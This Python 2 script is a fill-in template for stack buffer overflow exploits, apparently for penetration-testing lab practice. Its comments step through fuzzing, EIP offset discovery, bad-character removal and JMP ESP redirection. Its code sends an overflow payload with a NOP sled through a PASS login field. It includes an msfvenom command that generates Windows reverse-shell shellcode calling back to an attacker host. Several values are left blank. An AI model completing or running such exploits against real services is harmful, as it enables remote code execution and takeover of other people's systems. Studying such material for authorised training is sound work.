#!/usr/bin/python

# Stack-based Buffer Overflow Workflow
# Fuzz, observe crash and confirm the rough number of bytes to crash
# Determine the Offset for EIP with pattern_create.rb -l ... & pattern_offset.rb -q ...
# Confirm control of EIP
# Determine the Attack Vector: Examine Registers for a place to inject shellcode
# ...Remove Bad Characters in C's
# ...Redirect Execution Flow: nasm_shell.rb helps with this
# ...Remove Bad Characters in A's
# Add Shellcode...magic happens

import socket, time, struct, sys

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# PHASE 1: Confirm fuzzing...
fuzz = 
# payload="A" * fuzz

# PHASE 2: Determine the offset for EIP with pattern_create.rb -l ... & pattern_offset.rb -q ...
# EIP = ...
# .../pattern_offset.rb = Exact match at offset ...
# payload=""
offset = 

# PHASE 3: Confirm control of EIP and space for shellcode/decode
# payload="A" * offset + "B" * 4 + "C" * (fuzz - offset - 4)

# PHASE 4: Determine the Attack Vector
# NOTE: If EIP is no longer overwritten with B's...change attack vectors
# Try: 1) Checking EAX (which should point to start of buffer we control

# PHASE 5: Remove Bad Characters
badCharsCount = 255
badChars=( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
# \x00 (Null Byte) should never be included and will ternminate the command...
# Other bad chars are typically...
#   \x0a (LN Line Feed), \x0d (CR Carriage Return)
# payload="A" * offset + "B" * 4 + BadChars

# PHASE 6: Redirect Execution Flow: 
# nasm_shell.rb: JMP ESP = FFE4...
# Pick a dll and find jmp esp/FFE4 address = ...
jmpESP=""
# payload="A" * offset + jmpESP + "C" * (fuzz - offset - 4)
# Place a breakpoint at this address to confirm this occurs, or further debug

# PHASE 7: Add Shellcode from msfvenom...
# Note "Payload size:" = 
shell = 
# Be sure "Payload size" of shellcode does not exceed expectations
# Take into account encode/decode with noop sleds/slide  before shellcode..."\x90" * 16
# If application is threaded, use EXITFUNC=thread to not crash the app and repeadedly exploit
# non-staged payload x/shell_reverse_tcp vs staged: x/shell/reverse_tcp...nc can't handle these
# also consider multi/handler as the second stage
# msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... --format c --arch x86 
#   --platform windows --bad-chars "" --encoder x86/shikata_ga_nai

reverseshell=()
payload="A" * offset + jmpESP + "\x90" * 16 + reverseshell + "C" * (fuzz - offset - 4 - 4 - shell - 16)


try:
	IpAddress = str(sys.argv[1])
	port = int(sys.argv[2])
except IndexError:
	print "[+] Usage: python %s 10.11.xx.xx port" % sys.argv[0]
	sys.exit()

try:
	print "\nSending overflow test..."
	s.connect((IpAddress,port))
	s.recv(1024)
	s.send("USER me\r\n") # send parameter-example: "ParameterName value\r\n"
	s.recv(1024)
	s.send("PASS" + payload + "\r\n")
	s.close() # always close the connection
	print "\n...juicy payload injected"
except:
	print "Could not connect! Recheck connection and restart service"
	sys.exit()




